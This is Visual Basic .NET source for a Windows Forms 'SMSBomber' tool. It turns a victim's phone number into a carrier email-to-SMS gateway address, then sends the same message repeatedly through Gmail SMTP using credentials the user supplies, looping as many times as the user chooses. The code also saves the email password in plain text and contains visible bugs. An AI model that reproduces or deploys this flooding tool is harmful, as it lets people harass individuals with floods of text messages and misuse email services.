Imports System.IO
Imports System.Net
Imports System.Net.Mail
Public Class SMSBomber
    Dim value1 As String
    Dim value2 As String
    Dim carrier As String
    Dim EmailMessage As New MailMessage
    Private draggable As Boolean
    Private mouseY As Integer
    Private mouseX As Integer
    Private drag As Boolean




    Private Sub Start_Click(sender As Object, e As EventArgs) Handles Start.Click, Start.Click
        value1 = PhoneNumber.Text
        value2 = value1.Replace("(", "").Replace(")", "").Replace("-", "").Replace(" ", "")
        If metropcs.Checked = True Then
            carrier = value2 + "@mymetropcs.com"
        ElseIf att.Checked = True Then
            carrier = value2 + "@txt.att.net"
        ElseIf alltel.Checked = True Then
            carrier = value2 + "@message.alltel.com"
        ElseIf sprint.Checked = True Then
            carrier = value2 + "@messaging.sprintpcs.com"
        ElseIf tmobile.Checked + True Then
            carrier = value2 + "@tmomail.net"
        ElseIf verizon.Checked = True Then
            carrier = value2 + "@vtext.com"
        ElseIf bluegrass.Checked = True Then
            carrier = value1 + "sms.bluecell.com"
        ElseIf boost.Checked = True Then
            carrier = value1 + "myboostmobile.com"
        ElseIf cellcom.Checked = True Then
            carrier = value1 + "cellcom.quiktxt.com"
        ElseIf cricket.Checked = True Then
            carrier = value1 + "mms.cricketwireless.net"
        ElseIf rogers.Checked = True Then
            carrier = value1 + "pcs.rogers.com"
        ElseIf virgin.Checked = True Then
            carrier = value1 + "vmbol.com"
        End If
        MsgBox("Sending text to: " + carrier)

        Try
            If multipleText.Checked = False Then
                EmailMessage.From = New MailAddress(emailEmail.Text)
                EmailMessage.To.Add(carrier)
                EmailMessage.Subject = Subject.Text
                EmailMessage.Body = MessageToBomb.Text
                EmailMessage.Priority = MailPriority.High
                Dim SimpleSMTP As New SmtpClient("smtp.gmail.com")
                SimpleSMTP.Port = 587
                SimpleSMTP.EnableSsl = True
                SimpleSMTP.Credentials = New System.Net.NetworkCredential(emailEmail.Text, emailPass.Text)
                SimpleSMTP.Send(EmailMessage)
            ElseIf multipleText.Checked = True Then
                muliplebombs()
            End If
        Catch ex As Exception
            MsgBox("You Probably forgot to turn on 'Less Secure Apps'")
        End Try


    End Sub

    Private Sub muliplebombs()
        Dim i As Integer = 0
        Do Until i = BombTime.Text
            EmailMessage.From = New MailAddress(emailEmail.Text)
            EmailMessage.To.Add(carrier)
            EmailMessage.Subject = Subject.Text
            EmailMessage.Body = MessageToBomb.Text
            EmailMessage.Priority = MailPriority.High
            Dim SimpleSMTP As New SmtpClient("smtp.gmail.com")
            SimpleSMTP.Port = 587
            SimpleSMTP.EnableSsl = True
            SimpleSMTP.Credentials = New System.Net.NetworkCredential(emailEmail.Text, emailPass.Text)
            SimpleSMTP.Send(EmailMessage)
            i += 1
        Loop
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Close()
    End Sub

    Private Sub Panel1_MouseDown(sender As Object, e As MouseEventArgs) Handles Panel1.MouseDown
        draggable = True
        mouseX = Cursor.Position.X - Me.Left
        mouseY = Cursor.Position.Y - Me.Top
    End Sub
    Private Sub Panel1_MouseMove(sender As Object, e As MouseEventArgs) Handles Panel1.MouseMove
        If draggable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub
    Private Sub Panel1_MouseUp(sender As Object, e As MouseEventArgs) Handles Panel1.MouseUp
        draggable = False
    End Sub
    Private Sub Label4_MouseDown(sender As Object, e As MouseEventArgs) Handles Label4.MouseDown
        draggable = True
        mouseX = Cursor.Position.X - Me.Left
        mouseY = Cursor.Position.Y - Me.Top
    End Sub
    Private Sub Label4_MouseMove(sender As Object, e As MouseEventArgs) Handles Label4.MouseMove
        If draggable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub
    Private Sub Label4_MouseUp(sender As Object, e As MouseEventArgs) Handles Label4.MouseUp
        draggable = False
    End Sub
    Private Sub PictureBox1_MouseDown(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseDown
        draggable = True
        mouseX = Cursor.Position.X - Me.Left
        mouseY = Cursor.Position.Y - Me.Top
    End Sub
    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        If draggable Then
            Me.Top = Cursor.Position.Y - mouseY
            Me.Left = Cursor.Position.X - mouseX
        End If
    End Sub
    Private Sub PictureBox1_MouseUp(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseUp
        draggable = False
    End Sub

    Private Sub PhoneNumber_TextChanged(sender As Object, e As EventArgs) Handles PhoneNumber.TextChanged
        With PhoneNumber
            If .Text = "" Then
                .Text = "1234567890"
                .ForeColor = Color.Gray
            End If
            If .Text = "1234567890" And .ForeColor = Color.Gray Then
                .ShortcutsEnabled = False
            Else
                .ShortcutsEnabled = True
            End If
            If .TextLength > 10 Then
                If StrReverse(StrReverse(.Text).Remove(10)) = "1234567890" Then
                    .Text = .Text.Remove(.TextLength - 10)
                    .ForeColor = Color.White
                    .SelectionStart = .TextLength
                    .ScrollToCaret()
                End If
            End If
        End With

        If IsNumeric(PhoneNumber.Text) Then
        Else
            MessageBox.Show("Numbers Only", "Error")
            PhoneNumber.Text = ""
        End If

    End Sub
    Private Sub PhoneNumber_KeyDown(sender As Object, e As KeyEventArgs) Handles PhoneNumber.KeyDown
        With PhoneNumber
            If .Text = "1234567890" And .ForeColor = Color.Gray Then
                If e.KeyCode = Keys.Right Or e.KeyCode = Keys.Left Or e.KeyCode = Keys.Up Or e.KeyCode = Keys.Down Or e.KeyCode = Keys.Home Or e.KeyCode = Keys.End Then
                    e.Handled = True
                End If
            End If
        End With
    End Sub
    Private Sub PhoneNumber_MouseDown(sender As Object, e As MouseEventArgs) Handles PhoneNumber.MouseDown
        drag = True
        With PhoneNumber
            If .Text = "1234567890" And .ForeColor = Color.Gray Then
                .SelectionStart = .TextLength
                .SelectionLength = 0
                .SelectionStart = 0
                .ScrollToCaret()
            End If
        End With
    End Sub

    Private Sub PhoneNumber_MouseMove(sender As Object, e As MouseEventArgs) Handles PhoneNumber.MouseMove
        If drag Then
            With PhoneNumber
                If .Text = "1234567890" And .ForeColor = Color.Gray Then
                    PhoneNumber.Select(0, 0)
                End If
            End With
        End If
    End Sub
    Private Sub PhoneNumber_MouseUp(sender As Object, e As MouseEventArgs) Handles PhoneNumber.MouseUp
        drag = False
    End Sub

    Private Sub ClearMail_Click(sender As Object, e As EventArgs) Handles ClearMail.Click
        emailEmail.Text = ""
        emailPass.Text = ""
    End Sub

    Private Sub saveSettings_CheckedChanged(sender As Object, e As EventArgs) Handles saveSettings.CheckedChanged
        If saveSettings.Checked = True Then My.Settings.Email = emailEmail.Text
        If saveSettings.Checked = True Then My.Settings.Password = emailPass.Text
    End Sub

    Private Sub LoadMail_Click(sender As Object, e As EventArgs) Handles LoadMail.Click
        emailEmail.Text = My.Settings.Email
        emailPass.Text = My.Settings.Password
    End Sub

    Private Sub Showpass_CheckedChanged(sender As Object, e As EventArgs) Handles Showpass.CheckedChanged
        If Showpass.Checked = True Then
            emailPass.UseSystemPasswordChar = False
        ElseIf Showpass.CheckState = False Then
            emailPass.UseSystemPasswordChar = True
        End If
    End Sub
    Private Sub SMSBomber_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        emailPass.UseSystemPasswordChar = True
    End Sub
End Class